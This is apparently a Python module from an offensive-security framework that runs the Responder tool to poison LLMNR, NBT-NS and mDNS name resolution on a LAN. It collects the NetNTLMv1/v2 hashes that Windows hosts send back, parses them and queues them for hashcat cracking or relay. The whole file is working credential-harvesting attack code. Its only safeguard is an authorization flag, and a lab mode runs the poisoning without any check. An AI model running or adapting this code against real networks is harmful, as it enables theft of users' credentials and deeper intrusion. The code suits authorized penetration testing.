"""Responder-style hash harvesting on the joined LAN.

The kill-chain's JOIN phase (#1) puts Augur on the target LAN with a recovered
PSK. That is the opening for a classic internal move: answer the LLMNR / NBT-NS /
mDNS name-resolution queries that Windows hosts broadcast when DNS misses, and the
host authenticates *to you* — handing over a NetNTLMv1/v2 hash you crack offline
(hashcat -m 5500 / -m 5600) or relay. This wraps the real `responder` tool and,
crucially, turns its captured hashes into the same crack queue the Wi-Fi path uses.

A + B ⇒ C: A (we JOINED the LAN, #1) + B (responder poisons name resolution) ⇒
C (NetNTLM hashes → the crack pipeline → recovered credentials → deeper pivot).

This is a TRANSMIT-on-LAN action (it poisons responses), so it is a firing path:
FIELD gates it behind Scope + explicit authorization; LAB runs it unleashed on
your own network. The hash PARSER is pure and runner-injected, so the NetNTLM
formats are verified with no tool and no network.
"""
from __future__ import annotations

import re
import subprocess
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable, List, Optional, Sequence, Tuple

# NetNTLMv1 (hashcat -m 5500): user::DOMAIN:LMresp(48hex):NTresp(48hex):challenge(16hex)
_V1 = re.compile(r"([^\s:]+)::([^:]*):([0-9A-Fa-f]{48}):([0-9A-Fa-f]{48}):([0-9A-Fa-f]{16})")
# NetNTLMv2 (hashcat -m 5600): user::DOMAIN:serverchallenge(16hex):NTproof(32hex):blob(hex)
_V2 = re.compile(r"([^\s:]+)::([^:]*):([0-9A-Fa-f]{16}):([0-9A-Fa-f]{32}):([0-9A-Fa-f]{20,})")

HASHCAT_NETNTLMV1 = 5500
HASHCAT_NETNTLMV2 = 5600


@dataclass(frozen=True)
class NetNtlmHash:
    username: str
    domain: str
    kind: str              # "netntlmv1" | "netntlmv2"
    hashcat_mode: int      # 5500 | 5600
    hash_line: str         # the full crackable line (what hashcat eats)
    client_ip: str = ""

    def to_dict(self) -> dict:
        return {"username": self.username, "domain": self.domain, "kind": self.kind,
                "hashcat_mode": self.hashcat_mode, "client_ip": self.client_ip,
                "hash_line": self.hash_line}


def parse_responder_hashes(text: str, *, client_ip: str = "") -> List[NetNtlmHash]:
    """Pull NetNTLMv1/v2 hashes out of Responder output (log files or the session
    log). De-duplicated per (user, domain, kind). v1 is matched first (its fixed
    widths are the more specific pattern), else v2. Malformed lines are skipped."""
    out: List[NetNtlmHash] = []
    seen = set()
    for raw in (text or "").splitlines():
        line = raw.strip()
        if "::" not in line:
            continue
        # a Responder session line may prefix "[SMB] NTLMv2-SSP Hash : <hash>"
        if " Hash :" in line:
            line = line.split(" Hash :", 1)[1].strip()
        m1 = _V1.search(line)
        m2 = None if m1 else _V2.search(line)
        m = m1 or m2
        if not m:
            continue
        kind = "netntlmv1" if m1 else "netntlmv2"
        mode = HASHCAT_NETNTLMV1 if m1 else HASHCAT_NETNTLMV2
        user, domain = m.group(1), m.group(2)
        key = (user.lower(), domain.lower(), kind)
        if key in seen:
            continue
        seen.add(key)
        out.append(NetNtlmHash(username=user, domain=domain, kind=kind,
                               hashcat_mode=mode, hash_line=m.group(0), client_ip=client_ip))
    return out


@dataclass
class ResponderHarvest:
    """Run Responder on an authorized LAN interface, bounded, and return the
    NetNTLM hashes it captured. `runner` and `log_reader` are injected for tests."""
    iface: str
    runner: Callable = None
    seconds: int = 60
    analyze_only: bool = False                 # -A: watch without poisoning (passive recon)
    log_dir: str = "/usr/share/responder/logs"
    binary: str = "responder"

    def plan(self) -> List[str]:
        """The exact, glass-box command — poisons name resolution on `iface`."""
        argv = [self.binary, "-I", self.iface]
        if self.analyze_only:
            argv.append("-A")                  # analyze: listen, don't answer
        return argv

    def _read_logs(self) -> str:
        """Concatenate Responder's per-protocol hash logs (NTLMv1/v2 SSP dumps)."""
        try:
            d = Path(self.log_dir)
            texts = []
            for p in sorted(d.glob("*NTLM*.txt")):
                try:
                    texts.append(p.read_text(errors="replace"))
                except OSError:
                    continue
            return "\n".join(texts)
        except Exception:
            return ""

    def harvest(self, *, scope=None, authorized: bool = False, lab: bool = False,
                log_reader: Optional[Callable[[], str]] = None) -> Tuple[List[NetNtlmHash], str]:
        """Gate → run (bounded) → parse. Returns (hashes, reason). FIELD requires
        the LAN armed in scope AND --authorized; LAB runs on sight."""
        # posture gate: analyze-only (passive) is always fine; poisoning is a firing path
        if not self.analyze_only and not lab:
            if scope is not None:
                ok, why = scope.authorize(ip=None)       # the joined LAN must be armed
                if not ok and not authorized:
                    return [], f"refused: {why} (LAN not armed / not --authorized)"
            elif not authorized:
                return [], "refused: poisoning needs --authorized in FIELD (or LAB mode)"
        run = self.runner or subprocess.run
        reason = "analyze-only (passive)" if self.analyze_only else "poisoning name resolution"
        try:
            run(self.plan(), timeout=self.seconds, capture_output=True, text=True, check=False)
        except subprocess.TimeoutExpired:
            pass                                          # expected — it's a daemon we time-box
        except (OSError, subprocess.SubprocessError) as e:
            return [], f"responder failed to run: {type(e).__name__}"
        text = (log_reader or self._read_logs)()
        hashes = parse_responder_hashes(text)
        return hashes, (f"{reason}; harvested {len(hashes)} NetNTLM hash(es) in {self.seconds}s")


def to_crack_lines(hashes: Sequence[NetNtlmHash]) -> dict:
    """Group crackable hash lines by hashcat mode — ready to drop into the crack
    queue the Wi-Fi path already feeds (A joined-LAN loot meets B the cracker)."""
    by_mode: dict = {}
    for h in hashes:
        by_mode.setdefault(h.hashcat_mode, []).append(h.hash_line)
    return by_mode
